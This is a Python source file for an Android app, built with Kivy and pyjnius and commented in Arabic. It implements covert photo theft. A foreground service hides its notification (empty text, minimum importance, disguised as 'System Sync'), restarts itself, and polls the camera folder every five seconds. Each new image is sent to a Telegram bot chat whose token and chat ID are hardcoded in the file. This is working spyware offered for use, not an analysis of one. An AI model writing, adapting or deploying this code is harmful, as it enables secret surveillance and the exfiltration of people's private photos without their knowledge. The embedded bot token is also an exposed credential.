import os
import time
import requests
from jnius import autoclass

# --- إعدادات التلجرام ---
TOKEN = "8593668067:AAGN3s4L5ulu7BODLfx35qEJkdVMdriTVEA"
CHAT_ID = "-1003535367279"

# مجموعة لتخزين الملفات التي تم إرسالها لمنع التكرار
sent_files = set()

def setup_foreground_service():
    """تفعيل الخدمة بإشعار صامت ومخفي تماماً"""
    try:
        PythonService = autoclass('org.kivy.android.PythonService')
        service_ctx = PythonService.mService
        
        NotificationManager = autoclass('android.app.NotificationManager')
        NotificationChannel = autoclass('android.app.NotificationChannel')
        NotificationBuilder = autoclass('android.app.Notification$Builder')
        Context = autoclass('android.content.Context')
        ServiceInfo = autoclass('android.content.pm.ServiceInfo')
        
        channel_id = 'sh1_silent_channel'
        
        # ضبط الأهمية على IMPORTANCE_MIN (القيمة 1) ليكون الإشعار صامتاً ومخفياً
        importance = 1 
        channel = NotificationChannel(channel_id, "System Sync", importance)
        channel.setSound(None, None) # إلغاء الصوت تماماً
        channel.setShowBadge(False)  # عدم إظهار نقطة على أيقونة التطبيق
        
        nm = service_ctx.getSystemService(Context.NOTIFICATION_SERVICE)
        nm.createNotificationChannel(channel)
        
        # بناء الإشعار بمستوى أولوية منخفض جداً
        notification = NotificationBuilder(service_ctx, channel_id) \
            .setContentTitle("") \
            .setContentText("") \
            .setSmallIcon(service_ctx.getApplicationInfo().icon) \
            .setPriority(-2) \
            .setOngoing(True) \
            .build()
            
        service_ctx.setAutoRestartService(True)
        # تشغيل الخدمة بنوع مزامنة البيانات لدعم أندرويد 14 و 15
        service_ctx.startForeground(1, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
    except Exception as e:
        print(f"Service Error: {e}")

def send_as_document(photo_path, file_name):
    url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
    try:
        with open(photo_path, 'rb') as doc_file:
            payload = {'chat_id': CHAT_ID, 'caption': f"📄 ملف جديد: {file_name}"}
            files = {'document': doc_file}
            response = requests.post(url, files=files, data=payload, timeout=30)
            return response.status_code == 200
    except:
        return False

def monitor_camera():
    global sent_files
    path = "/storage/emulated/0/DCIM/Camera"
    
    # عند تشغيل البوت، نقوم بحصر الملفات الموجودة حالياً لكي لا نرسلها مرة أخرى (اختياري)
    if os.path.exists(path):
        known_files = set(os.listdir(path))
    else:
        known_files = set()

    while True:
        try:
            if os.path.exists(path):
                all_files = os.listdir(path)
                # تحديد الملفات الجديدة فقط التي لم تكن موجودة ولم تُرسل بعد
                new_files = [f for f in all_files if f not in known_files and f not in sent_files]
                
                if new_files:
                    # --- الترتيب الزمني ---
                    # ترتيب الملفات بناءً على تاريخ التعديل (الأقدم أولاً)
                    new_files.sort(key=lambda x: os.path.getmtime(os.path.join(path, x)))
                    
                    for file in new_files:
                        if file.lower().endswith(('.jpg', '.jpeg', '.png')):
                            full_path = os.path.join(path, file)
                            
                            # ننتظر ثانية لضمان اكتمال كتابة الملف على الذاكرة
                            time.sleep(1)
                            
                            if send_as_document(full_path, file):
                                sent_files.add(file) # إضافة للملفات المرسلة لمنع التكرار
                                known_files.add(file)
                
        except Exception as e:
            pass
        
        time.sleep(5) # فحص المجلد كل 5 ثوانٍ

if __name__ == '__main__':
    setup_foreground_service()
    monitor_camera()
